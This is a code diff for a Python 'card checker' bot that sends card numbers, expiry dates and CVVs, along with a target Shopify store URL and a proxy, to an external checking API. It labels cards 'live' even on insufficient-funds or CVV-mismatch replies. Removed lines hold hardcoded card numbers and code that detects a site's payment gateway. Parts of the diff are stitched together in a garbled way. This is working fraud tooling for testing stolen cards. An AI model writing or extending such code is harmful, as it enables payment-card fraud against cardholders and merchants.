@@ -1,118 +1,148 @@
 import requests
-import time
+import json
+import traceback
+import urllib3
 import random
 import re
-from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import urllib3
-import traceback
 
-# Disable SSL warnings
+# Disable SSL warnings (optional, if you make direct calls)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 # ==========================================
-# CONFIGURATION
+# HELPER FUNCTIONS (kept for compatibility)
 # ==========================================
-MAX_THREADS = 10
-HTTP_TIMEOUT = 15
 
-# Premium test cards for site validation
-PREMIUM_TEST_CARDS = [
-    {
-        "number": "4000223480638774",
-        "month": 9,
-        "year": 2029,
-        "verification_value": "635",
-        "name": "Test User"
-    },
-    {
-        "number": "4000223304826472",
-        "month": 2,
-        "year": 2029,
-        "verification_value": "795",
-        "name": "Test User"
-    },
-    {
-        "number": "4000223458167897",
-        "month": 8,
-        "year": 2029,
-        "verification_value": "105",
-        "name": "Test User"
-    }
-]
+def format_proxy(proxy):
+    """Format proxy string to requests format (if needed elsewhere)."""
+    try:
+        parts = proxy.split(':')
+        if len(parts) == 4:
+            host, port, user, password = parts
+            proxy_url = f"http://{user}:{password}@{host}:{port}"
+            return {'http': proxy_url, 'https': proxy_url}
+        elif len(parts) == 2:
+            host, port = parts
+            proxy_url = f"http://{host}:{port}"
+            return {'http': proxy_url, 'https': proxy_url}
+    except:
+        pass
+    return None
 
 
 # ==========================================
-# HELPER FUNCTIONS
+# MAIN CHECKER FUNCTION – USES EXTERNAL API
 # ==========================================
 
-def get_random_ua():
-    """Get random user agent"""
-    user_agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
-    ]
-    return random.choice(user_agents)
-
-
-def normalize_url(site_url):
-    """Normalize site URL"""
-    shop_url = site_url.strip()
-    if not shop_url.startswith(('http://', 'https://')):
-        shop_url = f"https://{shop_url}"
-    shop_url = shop_url.rstrip('/')
-    return shop_url
-
-def detect_payment_gateway_advanced(checkout_html, site_url):
+def check_site_shopify_direct(site_url, cc, proxy=None):
     """
-    🔍 DETECT ACTUAL PAYMENT GATEWAY
-    Returns: Gateway name (Stripe, Authorize.net, etc.)
+    Checks a credit card on a Shopify store by calling the external API:
+    https://kamalxd.tech/sh/index.php
+
+    Parameters:
+        site_url (str): The Shopify store URL.
+        cc (str): Card data in format "CC|MM|YYYY|CVV".
+        proxy (str, optional): Proxy in format "host:port:user:pass".
+
+    Returns:
+        dict: A dictionary with keys 'Response', 'status', 'gateway', 'price', 'site'.
+              This matches what your bot expects.
     """
-    html_lower = checkout_html.lower()
-    
-    # Stripe detection
-    if any(x in html_lower for x in ['stripe.com/v3/', 'stripe.js', 'pk_live_', 'pk_test_', 'stripekey']):
-        return "Stripe Card Payments"
-    
-    # Authorize.net detection
-    if any(x in html_lower for x in ['authorize.net', 'acceptjs', 'authorizenet']):
-        return "Authorize.net"
-    
-    # PayPal detection
-    if any(x in html_lower for x in ['paypal.com/sdk', 'paypal-checkout', 'paypalobjects.com']):
-        return "PayPal Express"
-    
-    # Braintree detection
-    if any(x in html_lower for x in ['braintree', 'braintreegateway']):
-        return "Braintree Payments"
-    
-    # Square detection
-    if any(x in html_lower for x in ['squareup.com', 'square-checkout', 'squarecdn.com']):
-        return "Square"
-    
-    # PingPong detection
-    if any(x in html_lower for x in ['pingpongx.com', 'pingpong', 'pingpong-checkout']):
-        return "PingPong Credit Card"
-    
-    # ONERWAY detection
-    if any(x in html_lower for x in ['onerway.com', 'onerway', 'oner-way']):
-        return "ONERWAY (Direct)"
-    
-    # Adyen detection
-    if any(x in html_lower for x in ['adyen.com', 'adyen-checkout']):
-        return "Adyen"
-    
-    # 2Checkout detection
-    if any(x in html_lower for x in ['2checkout', 'twocheckout']):
-        return "2Checkout"
-    
-    # Klarna detection
-    if any(x in html_lower for x in ['klarna.com', 'klarna-payments']):
-        return "Klarna"
-    
-    # Afterpay detection
+    try:
+        # Build API request parameters
+        api_url = "https://kamalxd.tech/sh/index.php"
+        params = {
+            'cc': cc,
+            'url': site_url
+        }
+        if proxy:
+            params['proxy'] = proxy
+
+        # Make the request (timeout 30 seconds)
+        response = requests.get(api_url, params=params, timeout=30)
+        data = response.json()
+
+        # Extract fields from API response
+        response_text = data.get('Response', 'Unknown')
+        price = data.get('Price', '0.00')
+        gateway = data.get('Gate', 'Unknown')
+        site = data.get('Site', site_url)
+
+        # Determine status based on response text
+        status = 'ERROR'
+        resp_lower = response_text.lower()
+        if 'approved' in resp_lower or 'live' in resp_lower or 'success' in resp_lower:
+            status = 'APPROVED'
+        elif 'declined' in resp_lower:
+            status = 'DECLINED'
+        elif 'insufficient' in resp_lower:
+            status = 'APPROVED'          # treat insufficient funds as live
+        elif 'cvv' in resp_lower:
+            status = 'APPROVED'           # treat CVV mismatch as live
+        elif 'do not honor' in resp_lower:
+            status = 'DECLINED'
+        else:
+            # If nothing matches, keep as ERROR
+            pass
+
+        return {
+            'Response': response_text,
+            'status': status,
+            'gateway': gateway,
+            'price': price,
+            'site': site
+        }
+
+    except requests.exceptions.Timeout:
+        return {
+            'Response': 'API timeout',
+            'status': 'ERROR',
+            'gateway': 'Unknown',
+            'price': '0.00',
+            'site': site_url
+        }
+    except Exception as e:
+        traceback.print_exc()
+        return {
+            'Response': f'API error: {str(e)}',
+            'status': 'ERROR',
+            'gateway': 'Unknown',
+            'price': '0.00',
+            'site': site_url
+        }
+
+
+# ==========================================
+# RESPONSE PARSER (unchanged, used by app.py)
+# ==========================================
+
+def process_response_shopify(api_response, site_price='0'):
+    """
+    Processes the dictionary returned by check_site_shopify_direct
+    and returns a tuple (message, status, gateway) as expected by app.py.
+    """
+    try:
+        if not api_response or not isinstance(api_response, dict):
+            return "System Error", "ERROR", "Unknown"
+
+        status = api_response.get('status', 'ERROR').upper()
+        message = api_response.get('Response', 'Unknown Result')
+        gateway = api_response.get('gateway', 'Shopify Payments')
+
+        # Map status to what app.py expects
+        if status == 'APPROVED':
+            # Check if OTP or 3DS is mentioned
+            if 'otp' in message.lower() or 'authentication' in message.lower():
+                status = 'APPROVED_OTP'
+        elif status == 'DECLINED':
+            pass  # keep as is
+        else:
+            status = 'ERROR'
+
+        return message, status, gateway
+
+    except Exception as e:
+        return f"Parse Error: {e}", "ERROR", "Unknown"    # Afterpay detection
     if any(x in html_lower for x in ['afterpay.com', 'afterpay-checkout', 'clearpay']):
         return "Afterpay"
     
@@ -849,4 +879,5 @@ def process_response_shopify(api_response, site_price='0'):
         return message, status, gateway
 
     except Exception as e:
+
         return f"Parse Error: {e}", "ERROR", "Unknown"
